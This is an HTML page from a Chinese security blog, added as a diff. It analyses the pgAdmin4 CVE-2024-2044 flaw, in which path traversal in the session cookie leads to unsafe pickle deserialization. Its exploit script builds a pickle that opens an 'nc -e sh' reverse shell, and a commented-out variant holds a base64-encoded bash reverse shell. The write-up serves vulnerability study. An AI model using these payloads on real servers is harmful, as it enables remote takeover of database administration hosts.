@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"baicany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一个简单的cve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pgadmin4反序列化代码执行">
+<meta property="og:url" content="https://baicany.github.io/2024/04/05/pgadmin4/index.html">
+<meta property="og:site_name" content="baicany">
+<meta property="og:description" content="一个简单的cve">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33730407/1712919396499-e6e6c574-08af-40dd-9193-090d2e6e6307.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/33730407/1712920691272-0e40b73a-d874-4b02-bcec-a3aefade0e9c.png">
+<meta property="article:published_time" content="2024-04-05T14:16:01.000Z">
+<meta property="article:modified_time" content="2024-06-09T12:26:01.965Z">
+<meta property="article:author" content="baicany">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/33730407/1712919396499-e6e6c574-08af-40dd-9193-090d2e6e6307.png">
+
+
+<link rel="canonical" href="https://baicany.github.io/2024/04/05/pgadmin4/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"https://baicany.github.io/2024/04/05/pgadmin4/","path":"2024/04/05/pgadmin4/","title":"pgadmin4反序列化代码执行"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pgadmin4反序列化代码执行 | baicany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">baicany</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome my world !</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="nav-number">5.</span> <span class="nav-text">修复方案</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="baicany"
+      src="/images/head.jpg">
+  <p class="site-author-name" itemprop="name">baicany</p>
+  <div class="site-description" itemprop="description">web小菜狗一枚</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://baicany.github.io/2024/04/05/pgadmin4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.jpg">
+      <meta itemprop="name" content="baicany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="baicany">
+      <meta itemprop="description" content="web小菜狗一枚">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pgadmin4反序列化代码执行 | baicany">
+      <meta itemprop="description" content="一个简单的cve">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pgadmin4反序列化代码执行
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-04-05 22:16:01" itemprop="dateCreated datePublished" datetime="2024-04-05T22:16:01+08:00">2024-04-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-06-09 20:26:01" itemprop="dateModified" datetime="2024-06-09T20:26:01+08:00">2024-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">一个简单的cve</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>闲来无事找点事干,去翻漏洞库的时候发现,这不是nk的题吗?看看小东西没做出来的东西有多难.</p>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>pgAdmin4 是开源数据库 PostgreSQL 的图形管理工具。2024年互联网上披露 CVE-2024-2044 pgAdmin4 反序列化代码执行漏洞。当pgAdmin4 运行在Window平台时攻击者可在无需登陆的情况下构造恶意请求造成远程代码执行。若pgAdmin4 运行在Unix平台时，需要先经过身份认证才可触发反序列化造成代码执行。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>pgAdmin版本&lt;&#x3D; 8.3</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://www.pgadmin.org/download/%E7%85%A7%E7%9D%80%E5%AE%98%E7%BD%91%E7%9A%84%E5%AE%89%E8%A3%85%E5%B0%B1%E8%A1%8C%E4%BA%86(%E6%88%91%E6%98%AF%E5%AE%89%E8%A3%85%E5%9C%A8%E6%A1%8C%E9%9D%A2%E7%9A%84),%E6%88%91%E6%98%AF%E5%9C%A8kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%8D%E7%8E%B0%E8%B0%83%E8%AF%95%E7%9A%84...%E8%BF%98%E6%98%AFmac%E5%A5%BD">https://www.pgadmin.org/download/照着官网的安装就行了(我是安装在桌面的),我是在kali虚拟机复现调试的...还是mac好</a></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞情报都给了是会话,看看会话里面用的什么</p>
+<p>原理还是挺简单的.主要还是从重写了open_session方法 pgadmin&#x2F;utils&#x2F;session.py里面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ManagedSessionInterface</span>(<span class="title class_ inherited__">SessionInterface</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, manager</span>):</span><br><span class="line">        self.manager = manager</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_session</span>(<span class="params">self, app, request</span>):</span><br><span class="line">        cookie_val = request.cookies.get(app.config[<span class="string">&#x27;SESSION_COOKIE_NAME&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> cookie_val <span class="keyword">or</span> <span class="string">&#x27;!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> cookie_val:</span><br><span class="line">            <span class="keyword">return</span> self.manager.new_session()</span><br><span class="line"></span><br><span class="line">        sid, digest = cookie_val.split(<span class="string">&#x27;!&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.manager.exists(sid):</span><br><span class="line">            <span class="keyword">return</span> self.manager.get(sid, digest)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.manager.new_session()</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>继承了SessionInterface,并且在open_ssesion里面会获取app.config[‘SESSION_COOKIE_NAME’]的值,在config.py里面写了SESSION_COOKIE_NAME &#x3D; ‘pga4_session’,获取值后通过第一个!分割成2个列表.这里的sid和digest就可控了.</p>
+<p>在__init__.py里面写了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> cli_mode:</span><br><span class="line">    app.session_interface = create_session_interface(</span><br><span class="line">        app, config.SESSION_SKIP_PATHS</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>跟进create_session_interface方法,发现我们的服务session_interface用的就是ManagedSessionInterface.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_session_interface</span>(<span class="params">app, skip_paths=[]</span>):</span><br><span class="line">    <span class="keyword">return</span> ManagedSessionInterface(</span><br><span class="line">        CachingSessionManager(</span><br><span class="line">            FileBackedSessionManager(</span><br><span class="line">                app.config[<span class="string">&#x27;SESSION_DB_PATH&#x27;</span>],</span><br><span class="line">                app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>],</span><br><span class="line">                app.config.get(<span class="string">&#x27;PGADMIN_SESSION_DISK_WRITE_DELAY&#x27;</span>, <span class="number">10</span>),</span><br><span class="line">                skip_paths</span><br><span class="line">            ),</span><br><span class="line">            <span class="number">1000</span>,</span><br><span class="line">            skip_paths</span><br><span class="line">        ))</span><br></pre></td></tr></table></figure>
+
+<p>所以传入ManagedSessionInterface的manger是CachingSessionManager.在ManagedSessionInterface的open_session方法里面if self.manager.exists(sid): return self.manager.get(sid, digest)</p>
+<p>但是manager实际上调用的都是FileBackedSessionManager方法这里就不提了挺简单的,直接看FileBackedSessionManager的方法 ,先看manager.exists(sid)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def exists(self, sid):</span><br><span class="line">        fname = os.path.join(self.path, sid)</span><br><span class="line">        return os.path.exists(fname)</span><br></pre></td></tr></table></figure>
+
+<p>会用os.path.join(self.path, sid) 检查有没有这个路径,有这个路径就会调用get来获取一个session托管,而get方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def get(self, sid, digest):</span><br><span class="line">    &#x27;Retrieve a managed session by session-id, checking the HMAC digest&#x27;</span><br><span class="line"></span><br><span class="line">    fname = os.path.join(self.path, sid)</span><br><span class="line">    data = None</span><br><span class="line">    hmac_digest = None</span><br><span class="line">    randval = None</span><br><span class="line"></span><br><span class="line">    if os.path.exists(fname):</span><br><span class="line">        try:</span><br><span class="line">            with open(fname, &#x27;rb&#x27;) as f:</span><br><span class="line">                randval, hmac_digest, data = load(f)</span><br><span class="line">        except Exception:</span><br><span class="line">            pass</span><br><span class="line">            ...</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>这里通过 fname &#x3D; os.path.join(self.path, sid) join拼接来获取文件路径和名字,判断有没有这个文件,有就读,然后load反序列化.而这里sid是我们cookie这里传进来的,sid为绝对路径的话,我们就不用管self.path, 比如:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">sid1=<span class="string">&quot;var&quot;</span></span><br><span class="line">sid2=<span class="string">&quot;/var&quot;</span></span><br><span class="line">fname1 = os.path.join(path, sid1)</span><br><span class="line">fname2 = os.path.join(path,sid2)</span><br><span class="line"><span class="built_in">print</span>(fname1)<span class="comment">#/home/kali/Desktop/var</span></span><br><span class="line"><span class="built_in">print</span>(fname2)<span class="comment">#/var</span></span><br></pre></td></tr></table></figure>
+
+<p>所以sid为我们想要的反序列化文件的绝对路径就行了.(..&#x2F;)</p>
+<p>所以想要利用的话,就得有一个能利用的文件了,所以看文件上传 pgadmin&#x2F;misc&#x2F;manager&#x2F;init.py</p>
+<p>实际上还是这个,要找路由就看哪里用了这个方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, req=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        File upload functionality</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.validate_request(<span class="string">&#x27;upload&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> unauthorized(self.ERROR_NOT_ALLOWED[<span class="string">&#x27;Error&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.shared_dir:</span><br><span class="line">        the_dir = self.shared_dir</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        the_dir = self.<span class="built_in">dir</span> <span class="keyword">if</span> self.<span class="built_in">dir</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        path = req.form.get(<span class="string">&#x27;currentpath&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        file_obj = req.files[<span class="string">&#x27;newfile&#x27;</span>]</span><br><span class="line">        file_name = file_obj.filename</span><br><span class="line">        orig_path = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(the_dir, path)</span><br><span class="line">        new_name = <span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span>.<span class="built_in">format</span>(orig_path, file_name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Check if the new file is inside the users directory</span></span><br><span class="line">            <span class="keyword">if</span> config.SERVER_MODE:</span><br><span class="line">                pathlib.Path(</span><br><span class="line">                    os.path.abspath(</span><br><span class="line">                        os.path.join(the_dir, new_name)</span><br><span class="line">                    )</span><br><span class="line">                ).relative_to(the_dir)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> unauthorized(self.ERROR_NOT_ALLOWED[<span class="string">&#x27;Error&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(new_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 4MB chunk (4 * 1024 * 1024 Bytes)</span></span><br><span class="line">                data = file_obj.read(<span class="number">4194304</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                f.write(data)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> internal_server_error(<span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            gettext(<span class="string">&#x27;There was an error adding the file:&#x27;</span>), e.strerror))</span><br><span class="line"></span><br><span class="line">    Filemanager.check_access_permission(the_dir, path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;Path&#x27;</span>: path,</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span>: new_name,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>文件上传就限制了大小和上传路径就不用细看了,所以先上传文件</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class A(object):</span></span><br><span class="line"><span class="comment">#     def __reduce__(self):</span></span><br><span class="line"><span class="comment">#         return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;echo \&quot;YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS85OTk5IDA+JjE=\&quot; | base64 -d | bash -i&#x27;)&quot;,))</span></span><br><span class="line"><span class="comment"># poc = A()</span></span><br><span class="line"><span class="comment"># result = pickle.dumps(poc)</span></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     with open(&#x27;1.pickle&#x27;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#         f.write(result)</span></span><br><span class="line"><span class="comment"># 机子不一样</span></span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">produce_pickle_bytes</span>(<span class="params">platform, cmd</span>):  </span><br><span class="line">    b = <span class="string">b&#x27;\x80\x04\x95&#x27;</span>  </span><br><span class="line">    b += struct.pack(<span class="string">&#x27;L&#x27;</span>, <span class="number">22</span> + <span class="built_in">len</span>(platform) + <span class="built_in">len</span>(cmd))+<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>  </span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(platform)) + platform.encode()  </span><br><span class="line">    b += <span class="string">b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span>  </span><br><span class="line">    b += <span class="string">b&#x27;\x8c&#x27;</span> + struct.pack(<span class="string">&#x27;b&#x27;</span>, <span class="built_in">len</span>(cmd)) + cmd.encode()  </span><br><span class="line">    b += <span class="string">b&#x27;\x94\x85\x94R\x94.&#x27;</span>  </span><br><span class="line">    <span class="built_in">print</span>(b)  </span><br><span class="line">    <span class="keyword">return</span> b  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;posix.pickle&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(produce_pickle_bytes(<span class="string">&#x27;posix&#x27;</span>, <span class="string">f&quot;nc xxx:xxx 443 -e sh&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>我的截图呢？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1712919396499-e6e6c574-08af-40dd-9193-090d2e6e6307.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1712920691272-0e40b73a-d874-4b02-bcec-a3aefade0e9c.png" alt="img"></p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>我觉得漏洞点还是因为cookie 因为json,sid哪里可以输入&#x2F; 并且我们上传文件的路径是知道,简单来说禁用里面有&#x2F;是可以的</p>
+<p>升级新版本</p>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/</a></p>
+<p>这个洞确实很简单.</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/29/fastjson2/" rel="prev" title="fastjsonのtwo!">
+                  <i class="fa fa-angle-left"></i> fastjsonのtwo!
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/05/01/jdk17%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/" rel="next" title="jdk17反射报错解决方法">
+                  jdk17反射报错解决方法 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">baicany</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
